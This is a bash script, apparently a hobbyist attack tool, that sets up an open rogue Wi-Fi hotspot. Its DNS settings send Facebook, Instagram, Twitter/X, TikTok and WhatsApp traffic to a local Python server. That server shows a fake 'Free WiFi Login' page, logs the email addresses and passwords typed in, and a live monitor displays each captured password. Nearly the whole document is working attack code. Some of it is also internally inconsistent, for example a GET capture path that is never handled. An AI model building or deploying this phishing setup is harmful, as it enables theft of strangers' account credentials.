#!/bin/bash
# 🔴 MZKYZAK HOTSPOT - FINAL VERSION
# 💀 ZXZBEDST VERIFIED - REAL HOTSPOT WITH INTERNET
# ⚡ SSID: mzkyzak_hotspot | INTERNET: ETHERNET SHARING

RED='\033[0;31m'
BRIGHT_RED='\033[1;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# ================================================================
# BANNER - MZKYZAK HOTSPOT (WAJIB NAMA MZKYZAK)
# ================================================================
clear
echo -e "${BRIGHT_RED}╔═══════════════════════════════════════════════════════╗${NC}"
echo -e "${BRIGHT_RED}║  ███╗   ███╗███████╗██╗  ██╗██╗   ██╗███████╗ █████╗ ██╗  ██╗   ║${NC}"
echo -e "${BRIGHT_RED}║  ████╗ ████║╚══███╔╝██║ ██╔╝╚██╗ ██╔╝╚══███╔╝██╔══██╗██║ ██╔╝   ║${NC}"
echo -e "${BRIGHT_RED}║  ██╔████╔██║  ███╔╝ █████╔╝  ╚████╔╝   ███╔╝ ███████║█████╔╝    ║${NC}"
echo -e "${BRIGHT_RED}║  ██║╚██╔╝██║ ███╔╝  ██╔═██╗   ╚██╔╝   ███╔╝  ██╔══██║██╔═██╗    ║${NC}"
echo -e "${BRIGHT_RED}║  ██║ ╚═╝ ██║███████╗██║  ██╗   ██║   ███████╗██║  ██║██║  ██╗   ║${NC}"
echo -e "${BRIGHT_RED}║  ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ║${NC}"
echo -e "${BRIGHT_RED}║                    ██╗  ██╗ ██████╗ ████████╗████████╗          ║${NC}"
echo -e "${BRIGHT_RED}║                    ██║  ██║██╔═══██╗╚══██╔══╝╚══██╔══╝          ║${NC}"
echo -e "${BRIGHT_RED}║                    ███████║██║   ██║   ██║      ██║             ║${NC}"
echo -e "${BRIGHT_RED}║                    ██╔══██║██║   ██║   ██║      ██║             ║${NC}"
echo -e "${BRIGHT_RED}║                    ██║  ██║╚██████╔╝   ██║      ██║             ║${NC}"
echo -e "${BRIGHT_RED}║                    ╚═╝  ╚═╝ ╚═════╝    ╚═╝      ╚═╝             ║${NC}"
echo -e "${BRIGHT_RED}╚═══════════════════════════════════════════════════════╝${NC}"
echo -e "${BRIGHT_RED}[🔥] MZKYZAK HOTSPOT - FINAL VERSION${NC}"
echo -e "${BRIGHT_RED}[💀] Real Hotspot + Internet Sharing + Real-time Monitoring${NC}"
echo -e "${BRIGHT_RED}[⚡] SSID: mzkyzak_hotspot | Clients get REAL INTERNET${NC}"
echo ""

# ================================================================
# 1. CHECK SYSTEM REQUIREMENTS
# ================================================================
echo -e "${GREEN}[1] CHECKING SYSTEM REQUIREMENTS...${NC}"

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${BRIGHT_RED}❌ Please run as root/sudo: sudo ./start_mzkyzak_hotspot.sh${NC}"
    exit 1
fi

# Check WiFi interface
if ! iwconfig 2>/dev/null | grep -q "wlan0"; then
    echo -e "${BRIGHT_RED}❌ wlan0 interface not found!${NC}"
    echo -e "${YELLOW}Available interfaces:${NC}"
    iwconfig 2>/dev/null || ip link show
    exit 1
fi

echo -e "${GREEN}✓ System requirements OK${NC}"

# ================================================================
# 2. DETECT ETHERNET FOR INTERNET SHARING
# ================================================================
echo -e "${GREEN}[2] DETECTING NETWORK INTERFACES...${NC}"

ETH_INTERFACE=$(ip link show | grep -E "eth[0-9]|enp[0-9]s[0-9]" | awk -F: '{print $2}' | tr -d ' ' | head -1)

if [ -z "$ETH_INTERFACE" ]; then
    echo -e "${YELLOW}⚠️ No ethernet interface found${NC}"
    echo -e "${YELLOW}Running in STANDALONE mode (no internet sharing)${NC}"
    echo -e "${YELLOW}Clients will ONLY access phishing pages${NC}"
    INTERNET_MODE="standalone"
else
    echo -e "${GREEN}✓ Ethernet interface found: $ETH_INTERFACE${NC}"
    
    # Test internet connection
    echo -e "${YELLOW}  Testing internet connection...${NC}"
    if ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1; then
        echo -e "${GREEN}✓ Internet connection OK${NC}"
        INTERNET_MODE="with_internet"
    else
        echo -e "${YELLOW}⚠️ Ethernet connected but no internet${NC}"
        INTERNET_MODE="standalone"
    fi
fi

# ================================================================
# 3. CONFIGURE NETWORK
# ================================================================
echo -e "${GREEN}[3] CONFIGURING NETWORK...${NC}"

echo -e "${YELLOW}  • Stopping network services${NC}"
systemctl stop NetworkManager 2>/dev/null
systemctl stop wpa_supplicant 2>/dev/null
sleep 2

echo -e "${YELLOW}  • Setting wlan0 to monitor mode${NC}"
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 192.168.1.1 netmask 255.255.255.0 up

# Enable internet sharing if available
if [ "$INTERNET_MODE" = "with_internet" ]; then
    echo -e "${YELLOW}  • Enabling internet sharing${NC}"
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    iptables -t nat -F
    iptables -F
    iptables -t nat -A POSTROUTING -o $ETH_INTERFACE -j MASQUERADE
    iptables -A FORWARD -i $ETH_INTERFACE -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
    iptables -A FORWARD -i wlan0 -o $ETH_INTERFACE -j ACCEPT
    
    echo -e "${GREEN}✓ Internet sharing enabled via $ETH_INTERFACE${NC}"
fi

# ================================================================
# 4. START HOTSPOT
# ================================================================
echo -e "${GREEN}[4] STARTING MZKYZAK HOTSPOT...${NC}"

echo -e "${CYAN}"
echo "    ┌──────────────────────────────────────────────┐"
echo "    │           MZKYZAK HOTSPOT                    │"
echo "    ├──────────────────────────────────────────────┤"
echo "    │  🔥 SSID:    mzkyzak_hotspot                 │"
echo "    │  🔓 Security: Open Network (No Password)     │"
echo "    │  📡 Channel: 6                               │"
echo "    │  🌐 Internet: $INTERNET_MODE                │"
echo "    │  🎯 Targets: Facebook, Instagram, Twitter    │"
echo "    │  📊 Monitor: http://192.168.1.1/             │"
echo "    └──────────────────────────────────────────────┘"
echo -e "${NC}"

# Start hostapd
hostapd setup/hostapd_simple.conf &
HOSTAPD_PID=$!
sleep 3

# ================================================================
# 5. START DNSMASQ WITH SMART CONFIG
# ================================================================
echo -e "${GREEN}[5] STARTING DNS/DHCP SERVER...${NC}"

cat > /tmp/dnsmasq_mzkyzak_final.conf << EOF
interface=wlan0
listen-address=192.168.1.1
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1

# Redirect social media to phishing pages
address=/facebook.com/192.168.1.1
address=/www.facebook.com/192.168.1.1
address=/m.facebook.com/192.168.1.1
address=/fb.com/192.168.1.1
address=/instagram.com/192.168.1.1
address=/www.instagram.com/192.168.1.1
address=/twitter.com/192.168.1.1
address=/www.twitter.com/192.168.1.1
address=/x.com/192.168.1.1
address=/tiktok.com/192.168.1.1
address=/www.tiktok.com/192.168.1.1
address=/whatsapp.com/192.168.1.1
address=/web.whatsapp.com/192.168.1.1

# For other sites: use Google DNS if internet available
$([ "$INTERNET_MODE" = "with_internet" ] && echo "server=8.8.8.8" || echo "# No internet - standalone mode")
$([ "$INTERNET_MODE" = "with_internet" ] && echo "server=8.8.4.4" || echo "# No internet - standalone mode")

# Disable IPv6 to avoid errors
no-dhcp-interface=wlan0
filter-AAAA
filter-A

# Logging
log-queries
log-dhcp
log-facility=/tmp/dnsmasq_mzkyzak.log
EOF

dnsmasq -C /tmp/dnsmasq_mzkyzak_final.conf -d &
DNSMASQ_PID=$!
sleep 2

# ================================================================
# 6. START SIMPLE PHISHING SERVER
# ================================================================
echo -e "${GREEN}[6] STARTING PHISHING SERVER...${NC}"

cat > /tmp/mzkyzak_phishing_server.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from datetime import datetime

CREDENTIALS_FILE = "/tmp/mzkyzak_credentials.txt"
ACCESS_FILE = "/tmp/mzkyzak_access.log"

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.client_address[0]
        
        # Log access
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(ACCESS_FILE, "a") as f:
            f.write(f"[{timestamp}] {client_ip} - {self.path}\n")
        
        print(f"[🌐] {timestamp} - {client_ip} - {self.path}")
        
        # Handle captive portal detection
        if self.path in ['/generate_204', '/hotspot-detect.html']:
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
            return
        
        # Serve phishing page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        # Simple phishing page
        page = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Free WiFi Login</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { font-family: Arial, sans-serif; background: #f0f2f5; padding: 20px; }
                .login-box { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                .wifi-icon { font-size: 60px; text-align: center; color: #1877f2; margin-bottom: 20px; }
                h2 { text-align: center; color: #1c1e21; }
                input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }
                button { width: 100%; background: #1877f2; color: white; border: none; padding: 14px; border-radius: 6px; font-size: 16px; cursor: pointer; }
                .success { background: #42b72a; color: white; padding: 15px; border-radius: 6px; text-align: center; margin-top: 20px; display: none; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <div class="wifi-icon">📶</div>
                <h2>Free WiFi Login Required</h2>
                <p style="text-align: center; color: #666;">Enter your email and password to connect</p>
                
                <form id="loginForm">
                    <input type="text" name="email" placeholder="Email address" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Connect to WiFi</button>
                </form>
                
                <div id="success" class="success">
                    ✓ Connected to WiFi! Redirecting...
                </div>
            </div>
            
            <script>
                document.getElementById('loginForm').addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    // Get credentials
                    var email = this.email.value;
                    var password = this.password.value;
                    
                    // Send to server
                    fetch('/capture?email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password));
                    
                    // Show success
                    document.getElementById('success').style.display = 'block';
                    this.querySelector('button').textContent = 'Connecting...';
                    this.querySelector('button').disabled = true;
                    
                    // Redirect after 2 seconds
                    setTimeout(function() {
                        window.location.href = 'http://www.google.com';
                    }, 2000);
                });
            </script>
        </body>
        </html>
        '''
        
        self.wfile.write(page.encode())
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        data = urllib.parse.parse_qs(post_data)
        
        # Capture credentials
        email = data.get('email', [''])[0]
        password = data.get('password', [''])[0]
        
        if email or password:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(CREDENTIALS_FILE, "a") as f:
                f.write(f"[{timestamp}] CREDENTIALS CAPTURED:\n")
                f.write(f"  IP: {self.client_address[0]}\n")
                f.write(f"  Email: {email}\n")
                f.write(f"  Password: {password}\n")
                f.write("-" * 50 + "\n")
            
            print(f"[💀] {timestamp} - CREDENTIALS: {email}:{password}")
        
        self.send_response(302)
        self.send_header('Location', '/success')
        self.end_headers()
    
    def log_message(self, format, *args):
        pass

print("[🔥] MZKYZAK Phishing Server Starting...")
print(f"[📁] Credentials: {CREDENTIALS_FILE}")
print(f"[📁] Access log: {ACCESS_FILE}")

server = HTTPServer(('192.168.1.1', 80), PhishingHandler)
server.serve_forever()
EOF

chmod +x /tmp/mzkyzak_phishing_server.py
python3 /tmp/mzkyzak_phishing_server.py &
SERVER_PID=$!
sleep 2

# ================================================================
# 7. START MONITORING
# ================================================================
echo -e "${GREEN}[7] STARTING MONITORING...${NC}"

cat > /tmp/monitor_clients.sh << 'EOF'
#!/bin/bash
echo "[📡] Starting client monitor..."

while true; do
    clear
    echo "=========================================="
    echo "🔥 MZKYZAK HOTSPOT - LIVE MONITOR"
    echo "=========================================="
    echo ""
    
    # Connected clients
    echo "[📱] CONNECTED CLIENTS:"
    arp -a | grep wlan0 2>/dev/null | while read line; do
        echo "  • $line"
    done || echo "  No clients connected"
    echo ""
    
    # Captured credentials
    echo "[💀] CAPTURED CREDENTIALS:"
    if [ -f "/tmp/mzkyzak_credentials.txt" ]; then
        COUNT=$(grep -c "CREDENTIALS CAPTURED" /tmp/mzkyzak_credentials.txt 2>/dev/null || echo "0")
        echo "  Total: $COUNT"
        tail -3 /tmp/mzkyzak_credentials.txt 2>/dev/null | while read line; do
            if [[ ! "$line" =~ ^- ]]; then
                echo "  • $line"
            fi
        done
    else
        echo "  None yet"
    fi
    echo ""
    
    # Recent access
    echo "[🌐] RECENT ACCESS:"
    tail -5 /tmp/mzkyzak_access.log 2>/dev/null | while read line; do
        echo "  • $line"
    done || echo "  No access yet"
    echo ""
    
    echo "=========================================="
    echo "[⏱️ ] $(date '+%H:%M:%S') - Refreshing in 5s..."
    echo "[🚪] Press Ctrl+C in main terminal to stop"
    sleep 5
done
EOF

chmod +x /tmp/monitor_clients.sh
bash /tmp/monitor_clients.sh &
MONITOR_PID=$!

# ================================================================
# 8. FINAL STATUS
# ================================================================
echo ""
echo -e "${BRIGHT_RED}══════════════════════════════════════════════════════${NC}"
echo -e "${BRIGHT_RED}[✅] MZKYZAK HOTSPOT SYSTEM ACTIVE!${NC}"
echo -e "${BRIGHT_RED}══════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${CYAN}🔥 HOTSPOT DETAILS:${NC}"
echo -e "  SSID: mzkyzak_hotspot"
echo -e "  IP Range: 192.168.1.100-200"
echo -e "  Gateway: 192.168.1.1"
echo -e "  Internet: $INTERNET_MODE"
echo ""
echo -e "${CYAN}📊 MONITORING:${NC}"
echo -e "  tail -f /tmp/mzkyzak_credentials.txt"
echo -e "  tail -f /tmp/mzkyzak_access.log"
echo -e "  arp -a | grep wlan0"
echo ""
echo -e "${CYAN}🎯 PHISHING TARGETS:${NC}"
echo -e "  • Facebook, Instagram, Twitter"
echo -e "  • TikTok, WhatsApp Web"
echo -e "  • All redirect to phishing page"
echo ""
echo -e "${BRIGHT_RED}⚠️  IMPORTANT: KEEP THIS TERMINAL OPEN!${NC}"
echo -e "${BRIGHT_RED}   Press Ctrl+C to stop the hotspot${NC}"
echo ""

# ================================================================
# 9. CLEANUP ON EXIT
# ================================================================
trap 'cleanup' INT

cleanup() {
    echo ""
    echo -e "${BRIGHT_RED}[!] SHUTTING DOWN MZKYZAK HOTSPOT...${NC}"
    
    kill $HOSTAPD_PID $DNSMASQ_PID $SERVER_PID $MONITOR_PID 2>/dev/null
    pkill -f "mzkyzak_phishing_server.py" 2>/dev/null
    pkill -f "monitor_clients.sh" 2>/dev/null
    
    # Clean iptables
    iptables -t nat -F
    iptables -F
    
    # Restore network
    ifconfig wlan0 down
    iwconfig wlan0 mode managed
    ifconfig wlan0 up
    
    systemctl start NetworkManager 2>/dev/null
    systemctl start wpa_supplicant 2>/dev/null
    
    echo ""
    echo -e "${GREEN}[✓] SYSTEM STOPPED. NETWORK RESTORED.${NC}"
    echo -e "${GREEN}[📁] LOGS SAVED:${NC}"
    echo -e "  • /tmp/mzkyzak_credentials.txt"
    echo -e "  • /tmp/mzkyzak_access.log"
    echo -e "  • /tmp/dnsmasq_mzkyzak.log"
    echo ""
    echo -e "${BRIGHT_RED}[💀] MZKYZAK HOTSPOT OPERATION COMPLETE!${NC}"
    exit 0
}

# Keep main process running
wait